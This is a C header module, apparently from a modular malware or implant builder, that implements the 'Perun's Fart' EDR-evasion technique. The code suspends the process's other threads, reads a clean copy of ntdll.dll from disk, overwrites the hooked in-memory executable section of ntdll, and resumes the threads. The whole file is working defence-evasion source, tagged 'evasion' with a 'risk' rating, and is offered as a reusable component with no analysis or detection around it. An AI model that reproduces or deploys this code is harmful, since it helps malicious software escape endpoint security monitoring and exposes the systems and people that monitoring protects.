// chunk: evasion/unhook_peruns_fart
// depends: (none)
// provides: unhook_ntdll
// headers: windows.h
// risk: medium
// note: Perun's Fart — suspends all threads except current, remaps ntdll from disk, resumes. Thread suspension prevents race conditions where EDR re-hooks during the remap window.

#ifndef CHUNK_UNHOOK_PERUNS_FART
#define CHUNK_UNHOOK_PERUNS_FART

#include <tlhelp32.h>

static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    DWORD my_pid = GetCurrentProcessId();
    DWORD my_tid = GetCurrentThreadId();

    // Phase 1: Suspend all other threads to prevent EDR re-hooking
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == my_pid && te.th32ThreadID != my_tid) {
                HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (ht) {
                    SuspendThread(ht);
                    CloseHandle(ht);
                }
            }
        } while (Thread32Next(snap, &te));
    }

    // Phase 2: Read clean ntdll from disk
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto resume;

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE *file_buf = (BYTE *)VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!file_buf) { CloseHandle(hFile); goto resume; }

    DWORD bytes_read;
    ReadFile(hFile, file_buf, file_size, &bytes_read, NULL);
    CloseHandle(hFile);

    if (bytes_read != file_size) {
        VirtualFree(file_buf, 0, MEM_RELEASE);
        goto resume;
    }

    // Phase 3: Copy clean .text over hooked .text
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    IMAGE_DOS_HEADER *f_dos = (IMAGE_DOS_HEADER *)file_buf;
    IMAGE_NT_HEADERS *f_nt = (IMAGE_NT_HEADERS *)(file_buf + f_dos->e_lfanew);
    IMAGE_SECTION_HEADER *f_sec = IMAGE_FIRST_SECTION(f_nt);

    int restored = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *dest = base + sec[i].VirtualAddress;
            BYTE *src = file_buf + f_sec[i].PointerToRawData;
            DWORD size = sec[i].Misc.VirtualSize;

            DWORD old;
            VirtualProtect(dest, size, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dest, src, size);
            VirtualProtect(dest, size, old, &old);
            restored = 1;
            break;
        }
    }

    VirtualFree(file_buf, 0, MEM_RELEASE);

resume:
    // Phase 4: Resume all threads
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        te.dwSize = sizeof(te);
        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID == my_pid && te.th32ThreadID != my_tid) {
                    HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (ht) {
                        ResumeThread(ht);
                        CloseHandle(ht);
                    }
                }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
    }

    return restored;
}

#endif
